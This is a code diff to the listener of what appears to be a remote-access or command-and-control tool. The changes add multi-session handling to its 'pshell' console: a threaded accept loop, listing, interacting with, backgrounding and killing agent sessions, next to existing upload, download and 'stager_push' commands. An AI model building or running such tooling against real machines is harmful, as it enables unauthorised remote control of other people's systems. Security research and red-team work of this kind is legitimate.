@@ -6,12 +6,18 @@ import struct
 import subprocess
 import sys
 import termios
+import threading
 import tty
 
 from core.plugins_engine import PluginsEngine
 
 HOST = "0.0.0.0"
 PORT = 9001
+
+sessions = {}
+session_lock = threading.Lock()
+session_counter = 1
+server_running = True
 
 
 def receive_exact(conn, size):
@@ -24,8 +30,15 @@ def receive_exact(conn, size):
     return buffer
 
 
-def handle_agent(conn, addr):
-    print(f"Connection: {addr}")
+def handle_agent(sid):
+    with session_lock:
+        if sid not in sessions or not sessions[sid]["active"]:
+            print("Session not found")
+            return
+        conn = sessions[sid]["conn"]
+        addr = sessions[sid]["addr"]
+
+    print(f"Connection: {sid} ({addr})")
     print("Exit - close program")
     print("drop - disconnect agent, allow he to reconnect")
     print("upload <path>, download <path>")
@@ -47,7 +60,7 @@ def handle_agent(conn, addr):
                 print("Closing session")
                 break
 
-            if cmd == "drop":
+            if cmd in ["background", "bg", "drop", "detach"]:
                 print("Disconnecting agent")
                 break
 
@@ -209,10 +222,53 @@ def handle_agent(conn, addr):
         conn.close()
 
 
+def accept_thread_func(server_socket):
+    global session_counter
+    while server_running:
+        try:
+            conn, addr = server_socket.accept()
+            with session_lock:
+                sid = session_counter
+                session_counter += 1
+                sessions[sid] = {"conn": conn, "addr": addr, "active": True}
+            print("\n\nNew session")
+        except Exception:
+            break
+
+
+def list_sessions():
+    print("\n" + "=" * 55)
+    print(f"{'ID':<5} | {'IP':<18} | {'PORT':<8} | {'STATUS':<10}")
+    print("-" * 55)
+    with session_lock:
+        if not sessions:
+            print("No active sessions")
+        for sid, data in sessions.items():
+            if data["active"]:
+                ip, port = data["addr"]
+                print(f"{sid:<5} | {ip:<18} | {port:<8} | ACTIVE")
+    print("=" * 55)
+
+
+def close_session(sid):
+    with session_lock:
+        if sid in sessions:
+            try:
+                sessions[sid]["conn"].close()
+            except Exception:
+                pass
+            sessions[sid]["active"] = False
+
+
 def pre_shell():
+    global server_running
+    server_socket = None
     while True:
         cmd = input("pshell> ")
         if cmd.startswith("listen"):
+            if server_socket is not None:
+                continue
+
             port = 9001
             if len(cmd.split()) < 2:
                 pass
@@ -221,21 +277,38 @@ def pre_shell():
 
             PORT = int(port)
 
-            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-            server.bind((HOST, PORT))
-            server.listen(1)
-            print(f"Listening for {HOST}:{PORT}")
-
+            server_socket.bind((HOST, PORT))
+            server_socket.listen(10)
+            t = threading.Thread(
+                target=accept_thread_func, args=(server_socket,), daemon=True
+            )
+            t.start()
+            # try:
+            #    while True:
+            #        conn, addr = server.accept()
+            #        handle_agent(conn, addr)
+            # except KeyboardInterrupt:
+            #    print("Closing")
+            # finally:
+            #    server.close()
+        elif cmd in ["sessions -l", "sessions"]:
+            list_sessions()
+        elif cmd.startswith("session -i"):
             try:
-                while True:
-                    conn, addr = server.accept()
-                    handle_agent(conn, addr)
-            except KeyboardInterrupt:
-                print("Closing")
-            finally:
-                server.close()
+                sid = int(cmd.split()[2])
+                handle_agent(sid)
+            except (IndexError, ValueError):
+                print("Usage: sessions -i <ID>")
+        elif cmd.startswith("session -k"):
+            try:
+                sid = int(cmd.split()[2])
+                close_session(sid)
+                print(f"Closed session [{sid}]")
+            except (IndexError, ValueError):
+                print("Usage: sessions -k <ID>")
         elif cmd.startswith("stager_push"):
             try:
                 parts = cmd.split()
